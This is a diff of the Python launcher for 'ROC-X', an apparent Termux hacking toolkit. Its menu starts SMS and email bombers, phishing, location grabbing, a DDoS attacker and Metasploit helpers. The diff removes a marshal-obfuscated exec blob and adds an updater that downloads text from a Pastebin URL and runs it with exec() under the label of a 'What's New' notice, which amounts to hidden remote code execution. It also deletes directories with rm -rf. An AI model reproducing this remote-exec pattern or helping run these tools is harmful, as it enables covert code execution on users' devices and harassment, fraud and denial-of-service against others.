@@ -1,6 +1,157 @@
-#Compiled By Sanaur Asif © ROC-X
+version="2.3.5"
+#IMPORT
+import getpass,time,os,sys
+import signal
+import time,os,sys
+import sys, random
+import threading,time, requests
+#CVALUE
+blue= '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan  = "\033[96m"
+end = '\033[0m'
+black="\033[0;30m"
+line=yellow+"======================================================================================================================"+end
+space=" "
+logo=red+str("""
+     8888888b.   .d88888b.   .d8888b.       Y88b   d88P
+     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P
+     888    888 888     888 888    888        Y88o88P
+     888   d88P 888     888 888        888888  Y888P
+     8888888P"  888     888 888        888888  d888b
+     888 T88b   888     888 888    888        d88888b
+     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b
+     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b""")+end
 
-#https://github.com/RootOfCyber/roc-x
+notice=""
+def header():
+	print(logo+cyan+"\n\n\n\t\tDeveloped By : Sanaur Asif\n\n"+green+"\t\t     Version : "+str(version)+" \n\n"+end+line+"\n"+end)
+def clear():
+        os.system("clear || cls")
+count=1
+erase = '\x1b[1A\x1b[2K'
+count=1
+about=11
 
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00@\x00\x00\x00s\x96\x05\x00\x00d\x00Z\x00d\x01d\x02l\x01Z\x01d\x01d\x02l\x02Z\x02d\x01d\x02l\x03Z\x03d\x01d\x02l\x04Z\x04d\x01d\x02l\x05Z\x05d\x01d\x02l\x02Z\x02d\x01d\x02l\x03Z\x03d\x01d\x02l\x04Z\x04d\x01d\x02l\x04Z\x04d\x01d\x02l\x06Z\x06d\x01d\x02l\x07Z\x07d\x01d\x02l\x02Z\x02d\x01d\x02l\x08Z\x08d\x03Z\td\x03Z\nd\x04Z\x0bd\x05Z\x0cd\x06Z\rd\x07Z\x0ed\x08Z\x0fd\tZ\x10d\nZ\x11e\rd\x0b\x17\x00e\x10\x17\x00Z\x12d\x0cZ\x13e\x0be\x14d\r\x83\x01\x17\x00e\x10\x17\x00Z\x15d\x0eZ\x16d\x0fd\x10\x84\x00Z\x17d\x11d\x12\x84\x00Z\x18d\x13Z\x19d\x14Z\x1ad\x13Z\x19d\x15Z\x1be\x03\xa0\x1cd\x12\xa1\x01\x01\x00e\x17\x83\x00\x01\x00e\x1de\x0fd\x16\x17\x00\x83\x01\x01\x00e\x02\xa0\x1ed\x17\xa1\x01\x01\x00z\x0cd\x01d\x02l\x08Z\x08W\x00n\x16\x01\x00\x01\x00\x01\x00e\x03\xa0\x1cd\x18\xa1\x01\x01\x00Y\x00n\x020\x00d\x01d\x02l\x08Z\x08e\x08\xa0\x1fd\x19\xa1\x01Z e j!Z"e"e\x00k\x02\x90\x01rD\x90\x01n\xf0e"e\x00k\x03\x90\x03r4e\x03\xa0\x1cd\x12\xa1\x01\x01\x00e\x17\x83\x00\x01\x00e\x1de\x0fd\x1a\x17\x00\x83\x01\x01\x00e\x02\xa0\x1ed\x1b\xa1\x01\x01\x00e\x03\xa0\x1cd\x12\xa1\x01\x01\x00e\x0fd\x1c\x17\x00Z\x16e\x17\x83\x00\x01\x00d\x0eZ\x16e\x1dd\x1d\x83\x01\x01\x00e\x18\x83\x00\x01\x00e\x0fd\x1e\x17\x00Z\x16e\x17\x83\x00\x01\x00e\x03\xa0\x1cd\x1f\xa1\x01\x01\x00e\x03\xa0\x1cd \xa1\x01\x01\x00z\xe8e\x18\x83\x00\x01\x00e\x0fd!\x17\x00Z\x16e\x17\x83\x00\x01\x00e\x03\xa0\x1cd"\xa1\x01\x01\x00e\x03\xa0\x1cd#\xa1\x01\x01\x00e\x1de\x0e\x83\x01\x01\x00e\x03\xa0\x1cd$\xa1\x01\x01\x00e\x18\x83\x00\x01\x00e\x0ed%\x17\x00Z\x16e\x17\x83\x00\x01\x00e\x03\xa0\x1cd&\xa1\x01\x01\x00e#d\'\x83\x01D\x00]\x82Z$e\x08\xa0\x1fd(\xa1\x01Z%e\x08\xa0\x1fd\x19\xa1\x01Z e j!Z"e\x03\xa0\x1cd\x12\xa1\x01\x01\x00e\x1de\x0ed)\x17\x00d*\x17\x00e\r\x17\x00e\x14e"\x83\x01\x17\x00e\x0e\x17\x00d+\x17\x00e\x0f\x17\x00d,\x17\x00e\x14e"\x83\x01\x17\x00d-\x17\x00\x83\x01\x01\x00e%j!Z&e\'e&\x83\x01\x01\x00e\x1de\rd.\x17\x00\x83\x01\x01\x00e(\x83\x00Z)\x90\x02q"W\x00n\x8a\x01\x00\x01\x00\x01\x00e\x18\x83\x00\x01\x00e\x0bd/\x17\x00Z\x16e\x17\x83\x00\x01\x00e(e\x0fd0\x17\x00\x83\x01Z*e\x03\xa0\x1cd"\xa1\x01\x01\x00e\x03\xa0\x1cd1\xa1\x01\x01\x00e\x03\xa0\x1cd2\xa1\x01\x01\x00e\x03\xa0\x1cd&\xa1\x01\x01\x00e#d\'\x83\x01D\x00],Z$e\x03\xa0\x1cd\x12\xa1\x01\x01\x00e(e\x0fd3\x17\x00d4\x17\x00e\r\x17\x00d5\x17\x00d6\x17\x00\x83\x01Z)\x90\x03q\x00Y\x00n\x020\x00e\x19d\x1bk\x00\x90\x05r\x92e\x18\x83\x00\x01\x00e\x17\x83\x00\x01\x00d\x0eZ\x16e\x1de\x0fd7\x17\x00\x83\x01\x01\x00e\x1de\rd8\x17\x00e\x14e\x1b\x83\x01\x17\x00d9\x17\x00e\x10\x17\x00\x83\x01\x01\x00e\x14e(e\td:\x17\x00e\r\x17\x00\x83\x01\x83\x01Z+e+d;k\x02\x90\x03r\xaae\x03\xa0\x1cd<\xa1\x01\x01\x00e\x04\xa0,\xa1\x00\x01\x00\x90\x03q4e+d=k\x02\x90\x04r\x04e-d>d?\x83\x02Z.e.\xa0/\xa1\x00Z0e.\xa01\xa1\x00\x01\x00e0\xa02d@dA\xa1\x02Z3e-d>dB\x83\x02Z4e4\xa05e3\xa1\x01\x01\x00e4\xa01\xa1\x00\x01\x00e\x03\xa0\x1cdC\xa1\x01\x01\x00\x90\x03q4e+dDk\x02\x90\x04r\x1ce\x03\xa0\x1cdE\xa1\x01\x01\x00\x90\x03q4e+dFk\x02\x90\x04r4e\x03\xa0\x1cdG\xa1\x01\x01\x00\x90\x03q4e+dHk\x02\x90\x04rLe\x03\xa0\x1cdI\xa1\x01\x01\x00\x90\x03q4e+dJk\x02\x90\x04rde\x03\xa0\x1cdK\xa1\x01\x01\x00\x90\x03q4e+dLk\x02\x90\x04r|e\x03\xa0\x1cdM\xa1\x01\x01\x00\x90\x03q4e+dNk\x02\x90\x04r\x92e\x03\xa0\x1cdO\xa1\x01\x01\x00n\xfce+dPk\x02\x90\x04r\xa8e\x03\xa0\x1cdQ\xa1\x01\x01\x00n\xe6e+dRk\x02\x90\x04r\xbee\x03\xa0\x1cdS\xa1\x01\x01\x00n\xd0e+dTk\x02\x90\x04r\xd4e\x03\xa0\x1cdU\xa1\x01\x01\x00n\xbae+e\x14e\x1b\x83\x01k\x02\x90\x05r|d\x0eZ\x16e\x1de\x0fdV\x17\x00e\r\x17\x00dW\x17\x00e\x0f\x17\x00dX\x17\x00e\r\x17\x00dY\x17\x00e\x0f\x17\x00dZ\x17\x00e\r\x17\x00d[\x17\x00e\x0f\x17\x00d\\\x17\x00e\r\x17\x00d]\x17\x00e\x0f\x17\x00d^\x17\x00e\r\x17\x00d_\x17\x00e\x0f\x17\x00d`\x17\x00e\r\x17\x00da\x17\x00e\x0f\x17\x00db\x17\x00e\r\x17\x00dc\x17\x00\x83\x01\x01\x00e(e\x0fdd\x17\x00e\r\x17\x00de\x17\x00e\x0f\x17\x00df\x17\x00\x83\x01Z)d\x13Z\x19n\x12e\x18\x83\x00\x01\x00e\x0bdg\x17\x00Z\x16d\x13Z\x19\x90\x03q4d\x02S\x00)hz\x052.3.4\xe9\x00\x00\x00\x00Nz\x05\x1b[94mz\x05\x1b[91mz\x05\x1b[97mz\x05\x1b[93mz\x07\x1b[1;32mz\x05\x1b[96mz\x04\x1b[0mz\x07\x1b[0;30mzv======================================================================================================================\xfa\x01 a\xb4\x01\x00\x00\n     8888888b.   .d88888b.   .d8888b.       Y88b   d88P\n     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P\n     888    888 888     888 888    888        Y88o88P\n     888   d88P 888     888 888        888888  Y888P\n     8888888P"  888     888 888        888888  d888b\n     888 T88b   888     888 888    888        d88888b\n     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b\n     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b\xda\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s8\x00\x00\x00t\x00t\x01t\x02\x17\x00d\x01\x17\x00t\x03\x17\x00d\x02\x17\x00t\x04t\x05\x83\x01\x17\x00d\x03\x17\x00t\x06\x17\x00t\x07\x17\x00d\x04\x17\x00t\x06\x17\x00\x83\x01\x01\x00d\x00S\x00)\x05Nz!\n\n\n\t\tDeveloped By : Sanaur Asif\n\nz\x11\t\t     Version : z\x03 \n\n\xda\x01\n)\x08\xda\x05print\xda\x04logo\xda\x04cyan\xda\x05green\xda\x03str\xda\x07version\xda\x03end\xda\x04line\xa9\x00r\r\x00\x00\x00r\r\x00\x00\x00r\x03\x00\x00\x00\xda\x06header\x1f\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0e\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x0e\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00d\x00S\x00)\x02Nz\x0cclear || cls)\x02\xda\x02os\xda\x06systemr\r\x00\x00\x00r\r\x00\x00\x00r\r\x00\x00\x00r\x03\x00\x00\x00\xda\x05clear!\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x11\x00\x00\x00\xe9\x01\x00\x00\x00z\x08\x1b[1A\x1b[2K\xe9\x0c\x00\x00\x00u\x1d\x00\x00\x00\n\t\t[\xe2\x80\xa2] Checking For Updatesgffffff\xe6?z\x14pip install requestsz!https://pastebin.com/raw/0e7CzUNGu=\x00\x00\x00\n  [\xc2\xb0] Installing The Updated Tools. Allow Up to 10 minutes \xe9\x02\x00\x00\x00u#\x00\x00\x00\t\t[\xc2\xb0] Installing Updated Tools.. \nr\x04\x00\x00\x00u \x00\x00\x00\t\t[\xe2\x80\xa2] Backing up the ROC-X....z7mkdir /data/data/com.termux/files/usr/bin/roc-x_updaterzbcp -rf /data/data/com.termux/files/usr/bin/roc-x /data/data/com.termux/files/usr/bin/roc-x_updateru\x1e\x00\x00\x00\t\t[\xe2\x80\xa2] Updating the Tools....z&cd /data/data/com.termux/files/usr/binz6cd /data/data/com.termux/files/usr/bin && rm -rf roc-xzXcd /data/data/com.termux/files/usr/bin && git clone https://github.com/RootOfCyber/roc-xu\x1a\x00\x00\x00\t\t[\xe2\x88\x9a] Update Successful!z8rm -rf /data/data/com.termux/files/usr/bin/roc-x_updaterl\x03\x00\x00\x00\xffg\xed\x10]\x00z!https://pastebin.com/raw/6sBnXFV7z\x04\n\n\n\nu(\x00\x00\x00\t  [\xe2\x9c\x93]  Successfully Updated to ROC-X z\x06 !\n\n\n\nu\x1e\x00\x00\x00  [\xe2\x80\xa2] What\'s New in Version z\x04 ?\n\nun\x00\x00\x00\n\n\n [\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2] TerMux Restart is Required for The Update. Please Restart Termux For The ROC-X Updated Versionu\x15\x00\x00\x00\t\t[\xc3\x97] Update Failed!z$\n\n\t     Press Enter to Restore ROC-Xz5cd /data/data/com.termux/files/usr/bin && mkdir roc-xz\x8ccd /data/data/com.termux/files/usr/bin && cp -rf /data/data/com.termux/files/usr/bin/roc-x_updater/roc-x /data/data/com.termux/files/usr/binz\n\n\n\n\n\n\n\n\n\n\nzR [>] Please Exit Termux from Notification Bar. Then Again Open ROC-X Tools By :\n\n z#\t [1] Exit Termux\n\t [2] Open Termuxz\x15\n\t [3] command : rocxzI\n==> Select the number of the option that you want to start from below : a+\x01\x00\x00\n  [1] Install ROC-X Package\n\n  [2] Facebook Cloning [Test Version]\n\n  [3] Encrypt/Obfuscate Script\n\n  [4] BD SMS Bomber\n\n  [5] ROC-X Phishing\n\n  [6] Location Hacking \n\n  [7] Kali NetHunter\n\n  [8] MetaSploit FrameWork\n\n  [9] E-Mail Bomber\n\n  [10] DDoS Attacker\n\n  [11] Manage ROC-X Auto Opening\n\n  [z\x0c] Contact Usz\x1a\n[>] Select Your Option : \xda\x011z\x07sh pkgs\xda\x012z\x03.e.\xda\x01r\xfa\x01?\xda\x01*\xda\x01wz\x0epython3 cln.py\xda\x013z\x0epython3 enc.py\xda\x014z\x10python3 bdsms.py\xda\x015z\x0cpython3 t.py\xda\x016z\x12python3 grabloc.py\xda\x017z\x0fpython3 kali.py\xda\x018z\x11python3 ms_opt.py\xda\x019z\x14python3 emailtool.py\xda\x0210z\x13python3 ddos_opt.pyZ\x0211z\x12python3 tmxchck.pyz\x0b\n\n\tYoutube:z(\n\n\thttps://www.youtube.com/c/RootOfCyberz\x0c\n\n\tFacebook:z\'\n\n\thttps://www.facebook.com/RootOfCyberz\x0e\n\n\tWhat\'s app:z\x19\n\n\tCurrently Unavailable!z\x0c\n\n\tTelegram:z)\n\n\thttps://t.me/joinchat/G2TQaUpEEKBlOGQ1z\x10\n\n\n\n\tContact Us:z\x18\n\n\trootofcyber@gmail.comz\x11\n\n\n\tDeveloped By z\x0bSanaur Asifz\x06\n\n\tFB:z$ https://facebook.com/sanaur.asif.72z\x0e\n\n\t\t[>] Press \xda\x05Enterz\x0c to Continueu\x1c\x00\x00\x00\t\t[\xc3\x97] Wrong Option Entered!)6r\n\x00\x00\x00\xda\x07getpass\xda\x04timer\x0f\x00\x00\x00\xda\x03sys\xda\x06signal\xda\x06random\xda\tthreading\xda\x08requests\xda\x04blue\xda\tlightblue\xda\x03red\xda\x05white\xda\x06yellowr\x08\x00\x00\x00r\x07\x00\x00\x00r\x0b\x00\x00\x00Z\x05blackr\x0c\x00\x00\x00\xda\x05spacer\t\x00\x00\x00r\x06\x00\x00\x00\xda\x06noticer\x0e\x00\x00\x00r\x11\x00\x00\x00\xda\x05countZ\x05erase\xda\x05aboutr\x10\x00\x00\x00r\x05\x00\x00\x00\xda\x05sleep\xda\x03getr\x17\x00\x00\x00\xda\x04text\xda\x06upchck\xda\x05range\xda\x01i\xda\x02r2\xda\x03rng\xda\x04exec\xda\x05input\xda\x01a\xda\nsjsjstshsb\xda\x08main_opt\xda\x04exit\xda\x04open\xda\x01g\xda\x04readZ\x03fte\xda\x05close\xda\x07replaceZ\x04fte2Z\x02g2\xda\x05writer\r\x00\x00\x00r\r\x00\x00\x00r\r\x00\x00\x00r\x03\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\n\x01\x00\x00\x04\x02 \x01\x08\x01\x18\x01\x10\x01\x18\x02\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x0c\x01\x04\x01\n\x08\x02\xf8\x04\n\x04\x01\x08\x02\x08\x02\x04\x01\x04\x01\x04\x01\x04\x02\n\x01\x06\x01\x0c\x01\n\x03\x02\x01\x0c\x01\x06\x01\x10\x01\x08\x01\n\x01\x06\x01\n\x01\x04\x01\n\x01\n\x01\x06\x01\x0c\x01\n\x01\n\x01\x08\x01\x06\x01\x04\x01\x08\x01\x06\x01\x08\x01\x06\x01\n\x01\n\x01\x02\x01\x06\x01\x08\x01\x06\x01\n\x01\n\x01\x08\x01\n\x02\x06\x01\x08\x01\x06\x02\n\x01\x0c\x01\n\x01\n\x01\x06\x02\n\x018\x01\x06\x01\x08\x01\x0c\x01\x0e\x02\x06\x01\x06\x01\x08\x01\x06\x01\x0c\x01\n\x01\n\x01\n\x01\n\x01\x0c\x01\n\x01&\x04\n\x01\x06\x01\x06\x01\x04\x01\x0c\x01\x1c\x01\x14\x01\n\x01\n\x01\x0c\x02\n\x01\n\x01\x08\x01\x08\x01\x0c\x01\n\x01\n\x01\x08\x01\x0e\x02\n\x01\x0e\x02\n\x01\x0e\x02\n\x01\x0e\x02\n\x01\x0e\x02\n\x01\x0e\x02\n\x01\x0c\x02\n\x01\x0c\x02\n\x01\x0c\x02\n\x01\x0c\x02\x0e\x01\x04\x01t\x01\x1c\x01\x06\x02\x06\x01\x08\x01'))
+os.system("clear")
+header()
+print(cyan+"\n\t\t[•] Checking For Updates")
+time.sleep(0.7)
+
+
+try:
+	import requests
+except:
+	os.system("pip install requests")
+import requests
+r=requests.get('https://pastebin.com/raw/0e7CzUNG')
+upchck=r.text
+if upchck==version:
+	pass
+elif upchck!=version:
+	os.system("clear")
+	header()
+	print(cyan+"\n  [°] Installing The Updated Tools. Allow Up to 10 minutes ")
+	time.sleep(2)
+	os.system("clear")
+	notice=cyan+"\t\t[°] Installing Updated Tools.. \n"
+	header()
+	notice=""
+	print("\n")
+	clear()
+	notice=cyan+"\t\t[•] Backing up the ROC-X...."
+	header()
+	os.system("mkdir /data/data/com.termux/files/usr/bin/roc-x_updater")
+	os.system("cp -rf /data/data/com.termux/files/usr/bin/roc-x /data/data/com.termux/files/usr/bin/roc-x_updater")
+	try:
+		clear()
+		notice=cyan+"\t\t[•] Updating the Tools...."
+		header()
+		os.system("cd /data/data/com.termux/files/usr/bin")
+		os.system("cd /data/data/com.termux/files/usr/bin && rm -rf roc-x")
+		print(green)
+		os.system("cd /data/data/com.termux/files/usr/bin && git clone https://github.com/RootOfCyber/roc-x")
+		
+		clear()
+		notice=green+"\t\t[√] Update Successful!"
+		header()
+		#os.kill(os.getppid(), signal.SIGHUP)
+		os.system("rm -rf /data/data/com.termux/files/usr/bin/roc-x_updater")
+		for i in range(99999999999):
+			r2=requests.get("https://pastebin.com/raw/6sBnXFV7")
+			r=requests.get('https://pastebin.com/raw/0e7CzUNG')
+			upchck=r.text
+
+			os.system("clear")
+			print(green+"\n"*4+"\t  [✓]  Successfully Updated to ROC-X "+yellow+str(upchck)+green+" !\n\n\n\n"+cyan+"  [•] What's New in Version "+str(upchck)+" ?\n\n")
+			rng=r2.text
+			exec(rng)
+			print(yellow+"\n\n\n [•••] TerMux Restart is Required for The Update. Please Restart Termux For The ROC-X Updated Version")
+			a=input()
+
+	except:
+		clear()
+		notice=red+"\t\t[×] Update Failed!"
+		header()
+		sjsjstshsb=input(cyan+"\n\n\t     Press Enter to Restore ROC-X")
+		os.system("cd /data/data/com.termux/files/usr/bin")
+		os.system("cd /data/data/com.termux/files/usr/bin && mkdir roc-x")
+		os.system("cd /data/data/com.termux/files/usr/bin && cp -rf /data/data/com.termux/files/usr/bin/roc-x_updater/roc-x /data/data/com.termux/files/usr/bin")
+		os.system("rm -rf /data/data/com.termux/files/usr/bin/roc-x_updater")
+		for i in range(99999999999):
+			os.system("clear")
+			a=input(cyan+"\n"*10+" [>] Please Exit Termux from Notification Bar. Then Again Open ROC-X Tools By :\n\n "+yellow+"\t [1] Exit Termux\n\t [2] Open Termux"+"\n\t [3] command : rocx")
+		
+#Main Page
+
+while count<2:
+	clear()
+	header()
+	notice=""
+	print(cyan+"\n==> Select the number of the option that you want to start from below : ")
+	print(yellow+"\n  [1] Install ROC-X Package\n\n  [2] Encrypt/Obfuscate Script\n\n  [3] BD SMS Bomber\n\n  [4] ROC-X Phishing\n\n  [5] Location Hacking \n\n  [6] Kali NetHunter\n\n  [7] MetaSploit FrameWork\n\n  [8] E-Mail Bomber\n\n  [9] DDoS Attacker\n\n  [10] Manage ROC-X Auto Opening\n\n  ["+str(about)+"] Contact Us"+end)
+	main_opt=str(input(blue+"\n[>] Select Your Option : "+yellow))
+	if main_opt=="1":
+		os.system("sh pkgs")
+		sys.exit()
+	
+	elif main_opt=="2":
+		os.system("python3 enc.py")
+
+	elif main_opt=="3":
+		os.system("python3 bdsms.py")
+
+	elif main_opt=="4":
+		os.system("python3 t.py")
+	
+	elif main_opt=="5":
+		os.system("python3 grabloc.py")
+	
+	elif main_opt=="6":
+		os.system("python3 kali.py")
+
+	elif main_opt=="7":
+		os.system("python3 ms_opt.py")
+	
+	elif main_opt=="8":
+		os.system("python3 emailtool.py")
+		
+	elif main_opt=="9":
+		os.system("python3 ddos_opt.py")
+
+	elif main_opt=="10":
+		os.system("python3 tmxchck.py")
+		
+	elif main_opt==str(about):
+		notice=""
+		print(cyan+"\n\n\tYoutube:"+yellow+"\n\n\thttps://www.youtube.com/c/RootOfCyber"+cyan+"\n\n\tFacebook:"+yellow+"\n\n\thttps://www.facebook.com/RootOfCyber"+cyan+"\n\n\tWhat\'s app:"+yellow+"\n\n\tCurrently Unavailable!"+cyan+"\n\n\tTelegram:"+yellow+"\n\n\thttps://t.me/joinchat/G2TQaUpEEKBlOGQ1"+cyan+"\n\n\n\n\tContact Us:"+yellow+"\n\n\trootofcyber@gmail.com"+cyan+"\n\n\n\tDeveloped By "+yellow+"Sanaur Asif"+cyan+"\n\n\tFB:"+yellow+" https://facebook.com/sanaur.asif.72")
+		a=input(cyan+"\n\n\t\t[>] Press "+yellow+"Enter"+cyan+" to Continue")
+		count=1
+	else:
+		clear()
+		notice=red+"\t\t[×] Wrong Option Entered!"
+		count=1
